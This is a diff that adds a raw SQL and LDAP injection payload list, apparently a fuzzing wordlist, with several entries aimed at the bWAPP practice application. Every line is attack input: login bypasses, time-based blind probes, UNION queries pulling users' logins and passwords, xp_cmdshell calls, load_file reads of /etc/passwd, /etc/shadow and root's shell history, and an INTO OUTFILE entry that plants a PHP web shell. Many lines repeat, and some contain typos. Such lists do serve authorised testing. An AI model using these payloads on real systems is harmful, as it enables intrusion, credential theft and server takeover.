@@ -1,0 +1,253 @@
+'
+"
+#
+-
+'%20--
+--';
+'%20;
+=%20'
+=%20;
+=%20--
+\x23
+\x27
+\x3D%20\x3B'
+\x3D%20\x27
+\x27\x4F\x52 SELECT *
+\x27\x6F\x72 SELECT *
+'or%20select *
+admin'--
+<>"'%;)(&+
+'%20or%20''='
+'%20or%20'x'='x
+"%20or%20"x"="x
+')%20or%20('x'='x
+0 or 1=1
+' or 0=0 --
+" or 0=0 --
+or 0=0 --
+' or 0=0 #
+" or 0=0 #
+or 0=0 #
+' or 1=1--
+" or 1=1--
+' or '1'='1'--
+"' or 1 --'"
+or 1=1--
+or%201=1
+or%201=1 --
+' or 1=1 or ''='
+" or 1=1 or ""="
+' or a=a--
+" or "a"="a
+') or ('a'='a
+") or ("a"="a
+&#39; or 0=0 –
+or 0=0 –
+&#34; or 0=0 #
+or 0=0 #
+&#39;&#41; or (&#39;a&#39;=&#39;a
+&#34;&#41; or (&#34;a&#34;=&#34;a
+hi" or "a"="a
+hi" or 1=1 --
+hi' or 1=1 --
+hi' or 'a'='a
+hi') or ('a'='a
+hi") or ("a"="a
+'hi' or 'x'='x';
+' and 1=1
+' or sleep(1) and 1=1#
+' or sleep(1)# 
+admin' and sleep(1)#
+' union select sleep(2),null,null,null,null,null,null#
+' union select null,sleep(1),null,null,null,null,null#
+' union select null,null,sleep(1),null,null,null,null#
+' union select null,null,null,sleep(1),null,null,null#
+' union select null,null,null,null,sleep(1),null,null#
+@variable
+,@variable
+' or username like '%
+' or userid like '%
+' or uid like '%
+' or user like '%
+exec xp
+exec sp
+'; exec master..xp_cmdshell
+'; exec xp_regread
+t'exec master..xp_cmdshell 'nslookup www.google.com'--
+--sp_password
+\x27UNION SELECT
+' UNION SELECT
+' UNION ALL SELECT
+' or (EXISTS)
+' (select top 1
+'||UTL_HTTP.REQUEST
+1;SELECT%20*
+to_timestamp_tz
+tz_offset
+&lt;&gt;&quot;'%;)(&amp;+
+'%20or%201=1
+%27%20or%201=1
+%20$(sleep%2050)
+%20'sleep%2050'
+char%4039%41%2b%40SELECT
+&apos;%20OR
+'sqlattempt1
+(sqlattempt2)
+|
+%7C
+*|
+%2A%7C
+*(|(mail=*))
+%2A%28%7C%28mail%3D%2A%29%29
+*(|(objectclass=*))
+%2A%28%7C%28objectclass%3D%2A%29%29
+(
+%28
+)
+%29
+&
+%26
+!
+%21
+' or 1=1 or ''='
+' or ''='
+x' or 1=1 or 'x'='y
+/
+//
+//*
+*/*
+' or 1=1 order by 7#
+' or 1=0 union select null,null,null,null,null,null,null# 
+' or 1=0 union select 1,2,3,4,5,6,7#
+' or 1=1 union select null,table_name,null,null,null,null,null from information_schema.tables#
+' or 1=0 union select null,table_schema,null,null,null,null,null from information_schema.columns#
+' or 1=0 union select null,version(),null,null,null,null,null from information_schema.columns#
+' or 1=0 union select null,@@version,null,null,null,null,null from information_schema.columns#
+' or 1=0 union select substring(version(),1,1)=1,null,null,null,null,null,null from information_schema.columns# 
+' or 1=0 union select substring(version(),1,1)=5,null,null,null,null,null,null from information_schema.columns# 
+' or 1=0 union select substring(version(),3,1)=2,null,null,null,null,null,null from information_schema.columns# 
+' or 1=0 union select 1,table_name,null,null,null,null,null from information_schema.columns#
+' or 1=1 select null,table_name,null,null,null,null,null from information_schema.columns where table_schema='public'# 
+' or 1=1 select null,column_name,,null,null,null,null,null from information_schema.columns where table_schema='public' and table_name='info'#
+' or 1=1 select null,table_name as table,column_name as column,null, null, null, null, null from information_schema.columns#
+' or 1=0 union select null,id,null,null,null,null,null from users# 
+' or 1=0 union select null, id,name, null,null,null,null from users#
+' or 1=0 UniOn selEct null,id,null,null,null,null,null FroM users#
+no=1 and 1=1#
+' or 1=1#
+-- or #
+'''''''''''''UNION SELECT '2
+AND true
+1' ORDER BY 1--+
+;waitfor delay '0:0:5'--
+' or length(database())=1#
+' unon select 1,2,3,4,5,6,7--
+1',(select table_name from information_schema.tables limit 1,1))#
+1' union select 1,group_concat(column_name),3,4,5,6,7 from information_schema.columns where table_name="users"-- -
+1 union all select 1,2,3,4,5,6,7#
+0' union select all 1,password,login,3,4,5,6,7 from users#
+0 union select 1,load_file("/etc/passwd"),3,4,5,6,7
+0 union select 1,load_file("/etc/apache2/apache2/conf"),3,4,5,6,7
+0 union select '<?system("$_GET['cmd']");?>'into outfile '/var/www/shell.php'
+1 waitfor delay '0:0:10'--
+declare @s varchar (200) select @s = 0x73656c65637420404076657273696f6e exec(@s)
+' or user like '%
+' UNION ALL SELECT
+' union select null,sleep(1),null,null,null,null,null#
+' union select null,null,sleep(1),null,null,null,null#
+' union select null,null,null,sleep(1),null,null,null#
+' union select null,null,null,null,sleep(1),null,null#
+--
+\x23
+\x27
+\x3D%20\x3B'
+\x3D%20\x27
+\x27\x4F\x52 SELECT *
+\x27\x6F\x72 SELECT *
+'or%20select *
+admin'--
+<>"'%;)(&+
+'%20or%20''='
+'%20or%20'x'='x
+"%20or%20"x"="x
+')%20or%20('x'='x
+1' ORDER BY 1--+
+1' ORDER BY 1,2--+
+1' GROUP BY 1,2,3--+
+;waitfor delay '0:0:5'--
+);waitfor delay '0:0:5'--
+';waitfor delay '0:0:5'--
+";waitfor delay '0:0:5'--
+');waitfor delay '0:0:5'--
+");waitfor delay '0:0:5'--
+));waitfor delay '0:0:5'--
+'));waitfor delay '0:0:5'--
+"));waitfor delay '0:0:5'--
+1 or benchmark(10000000,MD5(1))#
+" or benchmark(10000000,MD5(1))#
+' or benchmark(10000000,MD5(1))#
+ORDER BY SLEEP(5)
+ORDER BY 1,SLEEP(5)
+' or 1=1 order by 7#
+' or 1=0 union select null,null,null,null,null,null,null# 
+' or 1=0 union select 1,2,3,4,5,6,7#
+' or 1=1 union select null,table_name,null,null,null,null,null from information_schema.tables#
+' or 1=0 union select null,table_schema,null,null,null,null,null from information_schema.columns#
+' or 1=0 union select null,version(),null,null,null,null,null from information_schema.columns#
+' or 1=0 union select null,@@version,null,null,null,null,null from information_schema.columns#
+' or 1=0 union select substring(version(),1,1)=5,null,null,null,null,null,null from information_schema.columns# 
+' or 1=0 union select null,id,null,null,null,null,null from users# 
+' or 1=0 UniOn selEct null,id,null,null,null,null,null FroM users#
+' or length(database())=5#
+' or 1=1 and sqlite_version()>3--
+' or 1=1 and length((select tbl_name from sqlite_master limit 0,1))=4--
+' or 1=1 and substr((select tbl_name from sqlite_master limit 0,1),1,1)='b'--
+' or 1=1 and substr((select tbl_name from sqlite_master limit 0,1),2,1)='l'--
+' or 1=1 and ascii(substring(database(),1,1))=98#
+' or 1=1 and length((select table_name from information_schema.tables where table_type='base table' and table_schema='bWAPP' limit 0,1))=4#
+' or 1=1 and md5("bug")=(select password from users where login='bee')#, ' or 1=1 and sha1("bug")=(select password from users where login='bee')#
+' or 1=1 and sleep(1)#
+' or length(database())=5 and sleep(1)#
+' or substring(database(),1,1)='b' and sleep(1)#
+' or ascii(substring((select table_name from information_schema.tables where table_type='base table' and table_schema='bWAPP' limit 0,1),1,1))<100 and sleep(1)#
+' unon select 1,2,3,4,5,6--
+' union select 1,sqlite_version(),3,4,5,6--
+' union select 1,2,name,4,5,6 from sqlite_master--
+' union select 1,2,tbl_name,4,5,6 from sqlite_master--
+' union select 1,sql,3,4,5,6 from sqlite_master--
+',(select sqlite_version()))--
+',(select name from sqlite_master))--
+',(select name from sqlite_master limit 2,1))--
+',(select tbl_name from sqlite_master))--
+',(select sql from sqlite_master))--
+1',(select@@version))#
+1',(select database()))#
+1',(select table_name from information_schema.tables limit 1,1))#
+1',(select table_name from information_schema.tables limit 2,1))#
+1&#39;,&#40;select table_name from information_schema.tables limit 2,1&#41;&#41;#
+1' union select 1,2,3,4,5,6,7-- -
+1' order by 8-- -
+1' union select 1,database(),3,version(),5,6,7-- -
+1' union select 1,table_name,3,4,5,6,7 from information_schema.tables-- -
+1' union select 1,group_concat(column_name),3,4,5,6,7 from information_schema.columns where table_name="users"-- -
+1' union select 1,id,login,password,5,6,7 from users-- -
+1 union all select 1#
+1 union all select 1,2,3,4,5,6,7#
+0 union all select 1,2,3,4,5,6,7#
+0 union select all 1,2,3,4,5,6,7#
+0&#09;union&#09;all&#09;select&#09;1,2,3,4,5,6,7#
+0 uNiON SeLEcT AlL 1,2,3,4,5,6,7#
+0' union select all 1,2,3,4,5,6,7#
+0' union select all 1,table_name,database(),4,5,6,7 from infrmation_schema.tables#
+0' union select all 1,column name,database(),4,5,6,7 from information_schema.columns where table name='users'#
+0' union select all 1,password,login,4,5,6,7 from users#
+0 union select all 1,table_name,3,4,5,6,7 from information_schema.tables limit 1,1
+0 union select all 1,table_name,3,4,5,6,7 from information_schema.tables limit 2,1
+0 union select 1,table_name,3,4,5,6,7 from information_schema.tables#
+0' union select 1,column_name,database(),4,5,6,7 from information_schema.columns where table_name="users"#
+0 union select 1,load_file("/etc/passwd"),3,4,5,6,7
+0 union select 1,load_file("/etc/shadow"),3,4,5,6,7
+0 union select 1,load_file("/root/.bash_history"),3,4,5,6,7
+0 union select 1,load_file("/.rhosts"),3,4,5,6,7
+0 union select 1,load_file("/etc/apache2/apache2/conf"),3,4,5,6,7
+0 union select '<?system("$_GET['cmd']");?>'into outfile '/var/www/shell.php'
